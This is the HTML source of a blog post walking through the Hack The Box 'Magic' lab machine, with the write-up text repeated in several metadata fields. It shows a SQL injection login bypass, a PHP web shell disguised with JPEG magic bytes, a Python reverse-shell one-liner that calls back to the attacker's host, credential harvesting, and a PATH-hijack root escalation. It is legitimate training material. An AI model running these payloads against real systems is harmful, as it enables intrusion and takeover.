<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Magic" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.185 magic.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC magic.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:51 EDT Nmap scan report for magic.htb (10.10.10.185) Host is up (0.18s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds Enumeration (1) We got no credentials for the ssh service on port 22 so let check out the http service on port 80. On the bottom left, there’s a link to a login page. http://magic.htb/login.php: I threw in some basic SQL injection by putting &#39; or 1=1;-- in both the username and password and I got in? Nice. http://magic.htb/upload.php: I submitted nothing and I got this error: So, the application wants me to support an image. However, based on experience, file upload pages are usually a place where bugs commonly occur so lets see how can we bypass the protections in place. First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box! 1 2 3 4 5 6 7 $ cat shell.php &lt;?php if(isset($_GET[&#39;cmd&#39;])) { system($_GET[&#39;cmd&#39;]); } ?&gt; Lets think about what kind of checks might be in place. Maybe they are checking the file extension? 1 $ mv shell.php shell.php.jpeg They probably are but its still not good enough… Well since this box is called “Magic”, perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the file command to see what our file is interpreted as. 1 2 $ file shell.php.jpeg shell.php.jpeg: PHP script, ASCII text Well, our file is definitely not recognized as a JPEG file. According to this link, the magic bytes of a JPEG file is FF D8 FF E0. Hence, we can just append these bytes to the front of our file. 1 2 3 $ echo -e &quot;$(python -c &quot;print &#39;\xFF\xD8\xFF\xE0&#39;&quot;)$(cat shell.php.jpeg)&quot; &gt; shell.php.jpeg $ file shell.php.jpeg shell.php.jpeg: JPEG image data Now lets try uploading it. Now lets figure out where does our file end up at. If you go back to the home page and right-click on the images and click on “View Image”, you will see that uploaded images are saved to http://magic.htb/images/uploads/. So, lets see if our web shell is there! Note that the uploaded files get cleared every now and then so you might need to reupload your web shell again to see it. http://magic.htb/images/uploads/shell.php.jpeg: These weird characters that you see are actually the magic bytes you added to our web shell! If we add the ?cmd=whoami to the end of our URL, http://magic.htb/images/uploads/shell.php.jpeg?cmd=whoami: We see that we can now arbitrary commands! The next step is probably to establish a more stable reverse shell since our web shell will get deleted every now and then. Since Python 3 was installed on the box (You can run which python3 to see if it is installed), we can execute a python reverse shell. Starting our listener… 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And by visiting http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;, We now have a reverse shell. 1 2 3 4 5 6 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.185] 48482 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@ubuntu:/var/www/Magic/images/uploads$ As www-data, we can check out what files are there in the root directory of the web service. In /var/www/Magic, there were 2 files of interest. 1 2 3 4 5 6 7 8 9 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5 &lt;?php class Database { private static $dbName = &#39;Magic&#39; ; private static $dbHost = &#39;localhost&#39; ; private static $dbUsername = &#39;theseus&#39;; private static $dbUserPassword = &#39;iamkingtheseus&#39;; ... 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/backup.sql ... INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;); ... We got 2 usernames, theseus and admin, and 2 passwords, iamkingtheseus and Th3s3usW4sK1ng. Let see what users we have in /home`. 1 2 $ ls /home theseus user.txt I guess we now know what to do. Using the 2 passwords we found, we manage to su to theseus. 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets run LinEnum.sh to see we can find anything to help use escalate our privileges. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 theseus@ubuntu:/var/www/Magic/images/uploads$ wget http://10.10.XX.XX/LinEnum.sh --2020-08-22 04:59:07-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[========================================================&gt;] 45.39K 85.5KB/s in 0.5s 2020-08-22 04:59:08 (85.5 KB/s) - ‘LinEnum.sh’ saved [46476/46476] theseus@ubuntu:/tmp$ chmod +x LinEnum.sh ... [-] SUID files: ... -rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo ... sysinfo is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it, 1 2 3 4 5 6 theseus@ubuntu:/tmp$ ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen popen(&quot;lshw -short&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;fdisk -l&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;cat /proc/cpuinfo&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;free -h&quot;, &quot;r&quot;) = 0x5579b300ee80 It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our $PATH variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose free. Preparing our payload: 1 2 theseus@ubuntu:/tmp$ echo &quot;/bin/bash&quot; &gt;&gt; /tmp/free theseus@ubuntu:/tmp$ chmod +x free Manipulating our $PATH variable so that the OS will check /tmp for free: 1 2 3 theseus@ubuntu:/tmp$ PATH=/tmp:$PATH theseus@ubuntu:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games And now finally, if we run /bin/sysinfo: 1 2 3 theseus@ubuntu:/tmp$ /bin/sysinfo ====================Hardware Info==================== root@ubuntu:/tmp# root.txt We are now root! However, the output of commands will not be printed until I exit the current shell. 1 2 3 4 5 6 7 root@ubuntu:/tmp# cat /root/root.txt cat /root/root.txt root@ubuntu:/tmp# exit exit exit 4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX theseus@ubuntu:/tmp$ Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.185 magic.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC magic.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:51 EDT Nmap scan report for magic.htb (10.10.10.185) Host is up (0.18s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds Enumeration (1) We got no credentials for the ssh service on port 22 so let check out the http service on port 80. On the bottom left, there’s a link to a login page. http://magic.htb/login.php: I threw in some basic SQL injection by putting &#39; or 1=1;-- in both the username and password and I got in? Nice. http://magic.htb/upload.php: I submitted nothing and I got this error: So, the application wants me to support an image. However, based on experience, file upload pages are usually a place where bugs commonly occur so lets see how can we bypass the protections in place. First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box! 1 2 3 4 5 6 7 $ cat shell.php &lt;?php if(isset($_GET[&#39;cmd&#39;])) { system($_GET[&#39;cmd&#39;]); } ?&gt; Lets think about what kind of checks might be in place. Maybe they are checking the file extension? 1 $ mv shell.php shell.php.jpeg They probably are but its still not good enough… Well since this box is called “Magic”, perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the file command to see what our file is interpreted as. 1 2 $ file shell.php.jpeg shell.php.jpeg: PHP script, ASCII text Well, our file is definitely not recognized as a JPEG file. According to this link, the magic bytes of a JPEG file is FF D8 FF E0. Hence, we can just append these bytes to the front of our file. 1 2 3 $ echo -e &quot;$(python -c &quot;print &#39;\xFF\xD8\xFF\xE0&#39;&quot;)$(cat shell.php.jpeg)&quot; &gt; shell.php.jpeg $ file shell.php.jpeg shell.php.jpeg: JPEG image data Now lets try uploading it. Now lets figure out where does our file end up at. If you go back to the home page and right-click on the images and click on “View Image”, you will see that uploaded images are saved to http://magic.htb/images/uploads/. So, lets see if our web shell is there! Note that the uploaded files get cleared every now and then so you might need to reupload your web shell again to see it. http://magic.htb/images/uploads/shell.php.jpeg: These weird characters that you see are actually the magic bytes you added to our web shell! If we add the ?cmd=whoami to the end of our URL, http://magic.htb/images/uploads/shell.php.jpeg?cmd=whoami: We see that we can now arbitrary commands! The next step is probably to establish a more stable reverse shell since our web shell will get deleted every now and then. Since Python 3 was installed on the box (You can run which python3 to see if it is installed), we can execute a python reverse shell. Starting our listener… 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And by visiting http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;, We now have a reverse shell. 1 2 3 4 5 6 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.185] 48482 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@ubuntu:/var/www/Magic/images/uploads$ As www-data, we can check out what files are there in the root directory of the web service. In /var/www/Magic, there were 2 files of interest. 1 2 3 4 5 6 7 8 9 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5 &lt;?php class Database { private static $dbName = &#39;Magic&#39; ; private static $dbHost = &#39;localhost&#39; ; private static $dbUsername = &#39;theseus&#39;; private static $dbUserPassword = &#39;iamkingtheseus&#39;; ... 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/backup.sql ... INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;); ... We got 2 usernames, theseus and admin, and 2 passwords, iamkingtheseus and Th3s3usW4sK1ng. Let see what users we have in /home`. 1 2 $ ls /home theseus user.txt I guess we now know what to do. Using the 2 passwords we found, we manage to su to theseus. 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets run LinEnum.sh to see we can find anything to help use escalate our privileges. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 theseus@ubuntu:/var/www/Magic/images/uploads$ wget http://10.10.XX.XX/LinEnum.sh --2020-08-22 04:59:07-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[========================================================&gt;] 45.39K 85.5KB/s in 0.5s 2020-08-22 04:59:08 (85.5 KB/s) - ‘LinEnum.sh’ saved [46476/46476] theseus@ubuntu:/tmp$ chmod +x LinEnum.sh ... [-] SUID files: ... -rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo ... sysinfo is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it, 1 2 3 4 5 6 theseus@ubuntu:/tmp$ ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen popen(&quot;lshw -short&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;fdisk -l&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;cat /proc/cpuinfo&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;free -h&quot;, &quot;r&quot;) = 0x5579b300ee80 It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our $PATH variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose free. Preparing our payload: 1 2 theseus@ubuntu:/tmp$ echo &quot;/bin/bash&quot; &gt;&gt; /tmp/free theseus@ubuntu:/tmp$ chmod +x free Manipulating our $PATH variable so that the OS will check /tmp for free: 1 2 3 theseus@ubuntu:/tmp$ PATH=/tmp:$PATH theseus@ubuntu:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games And now finally, if we run /bin/sysinfo: 1 2 3 theseus@ubuntu:/tmp$ /bin/sysinfo ====================Hardware Info==================== root@ubuntu:/tmp# root.txt We are now root! However, the output of commands will not be printed until I exit the current shell. 1 2 3 4 5 6 7 root@ubuntu:/tmp# cat /root/root.txt cat /root/root.txt root@ubuntu:/tmp# exit exit exit 4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX theseus@ubuntu:/tmp$ Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/magic-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/magic-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-23T00:38:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Magic" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/magic-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.185 magic.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ nmap -sV -sT -sC magic.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:51 EDT Nmap scan report for magic.htb (10.10.10.185) Host is up (0.18s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds Enumeration (1) We got no credentials for the ssh service on port 22 so let check out the http service on port 80. On the bottom left, there’s a link to a login page. http://magic.htb/login.php: I threw in some basic SQL injection by putting &#39; or 1=1;-- in both the username and password and I got in? Nice. http://magic.htb/upload.php: I submitted nothing and I got this error: So, the application wants me to support an image. However, based on experience, file upload pages are usually a place where bugs commonly occur so lets see how can we bypass the protections in place. First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box! 1 2 3 4 5 6 7 $ cat shell.php &lt;?php if(isset($_GET[&#39;cmd&#39;])) { system($_GET[&#39;cmd&#39;]); } ?&gt; Lets think about what kind of checks might be in place. Maybe they are checking the file extension? 1 $ mv shell.php shell.php.jpeg They probably are but its still not good enough… Well since this box is called “Magic”, perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the file command to see what our file is interpreted as. 1 2 $ file shell.php.jpeg shell.php.jpeg: PHP script, ASCII text Well, our file is definitely not recognized as a JPEG file. According to this link, the magic bytes of a JPEG file is FF D8 FF E0. Hence, we can just append these bytes to the front of our file. 1 2 3 $ echo -e &quot;$(python -c &quot;print &#39;\\xFF\\xD8\\xFF\\xE0&#39;&quot;)$(cat shell.php.jpeg)&quot; &gt; shell.php.jpeg $ file shell.php.jpeg shell.php.jpeg: JPEG image data Now lets try uploading it. Now lets figure out where does our file end up at. If you go back to the home page and right-click on the images and click on “View Image”, you will see that uploaded images are saved to http://magic.htb/images/uploads/. So, lets see if our web shell is there! Note that the uploaded files get cleared every now and then so you might need to reupload your web shell again to see it. http://magic.htb/images/uploads/shell.php.jpeg: These weird characters that you see are actually the magic bytes you added to our web shell! If we add the ?cmd=whoami to the end of our URL, http://magic.htb/images/uploads/shell.php.jpeg?cmd=whoami: We see that we can now arbitrary commands! The next step is probably to establish a more stable reverse shell since our web shell will get deleted every now and then. Since Python 3 was installed on the box (You can run which python3 to see if it is installed), we can execute a python reverse shell. Starting our listener… 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And by visiting http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.XX.XX&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;, We now have a reverse shell. 1 2 3 4 5 6 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.185] 48482 /bin/sh: 0: can&#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@ubuntu:/var/www/Magic/images/uploads$ As www-data, we can check out what files are there in the root directory of the web service. In /var/www/Magic, there were 2 files of interest. 1 2 3 4 5 6 7 8 9 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5 &lt;?php class Database { private static $dbName = &#39;Magic&#39; ; private static $dbHost = &#39;localhost&#39; ; private static $dbUsername = &#39;theseus&#39;; private static $dbUserPassword = &#39;iamkingtheseus&#39;; ... 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/backup.sql ... INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;); ... We got 2 usernames, theseus and admin, and 2 passwords, iamkingtheseus and Th3s3usW4sK1ng. Let see what users we have in /home`. 1 2 $ ls /home theseus user.txt I guess we now know what to do. Using the 2 passwords we found, we manage to su to theseus. 1 2 3 4 www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Lets run LinEnum.sh to see we can find anything to help use escalate our privileges. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 theseus@ubuntu:/var/www/Magic/images/uploads$ wget http://10.10.XX.XX/LinEnum.sh --2020-08-22 04:59:07-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[========================================================&gt;] 45.39K 85.5KB/s in 0.5s 2020-08-22 04:59:08 (85.5 KB/s) - ‘LinEnum.sh’ saved [46476/46476] theseus@ubuntu:/tmp$ chmod +x LinEnum.sh ... [-] SUID files: ... -rwsr-x--- 1 root users 22040 Oct 21 2019 /bin/sysinfo ... sysinfo is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it, 1 2 3 4 5 6 theseus@ubuntu:/tmp$ ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen ltrace /bin/sysinfo 2&gt;&amp;1 | grep popen popen(&quot;lshw -short&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;fdisk -l&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;cat /proc/cpuinfo&quot;, &quot;r&quot;) = 0x5579b300ee80 popen(&quot;free -h&quot;, &quot;r&quot;) = 0x5579b300ee80 It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our $PATH variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose free. Preparing our payload: 1 2 theseus@ubuntu:/tmp$ echo &quot;/bin/bash&quot; &gt;&gt; /tmp/free theseus@ubuntu:/tmp$ chmod +x free Manipulating our $PATH variable so that the OS will check /tmp for free: 1 2 3 theseus@ubuntu:/tmp$ PATH=/tmp:$PATH theseus@ubuntu:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games And now finally, if we run /bin/sysinfo: 1 2 3 theseus@ubuntu:/tmp$ /bin/sysinfo ====================Hardware Info==================== root@ubuntu:/tmp# root.txt We are now root! However, the output of commands will not be printed until I exit the current shell. 1 2 3 4 5 6 7 root@ubuntu:/tmp# cat /root/root.txt cat /root/root.txt root@ubuntu:/tmp# exit exit exit 4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX theseus@ubuntu:/tmp$ Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/magic-htb/","@type":"BlogPosting","headline":"Hack The Box - Magic","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-08-23T00:38:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Magic | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas 